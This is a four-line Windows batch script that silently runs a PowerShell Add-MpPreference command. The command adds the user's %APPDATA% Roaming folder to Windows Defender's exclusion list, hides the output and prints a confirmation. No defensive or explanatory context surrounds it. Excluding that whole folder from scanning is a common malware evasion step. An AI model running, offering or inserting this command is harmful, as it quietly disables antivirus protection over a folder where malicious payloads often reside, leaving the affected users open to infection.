@echo off
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'" >nul 2>&1
echo Roaming folder added to Windows Defender exclusions.
exit

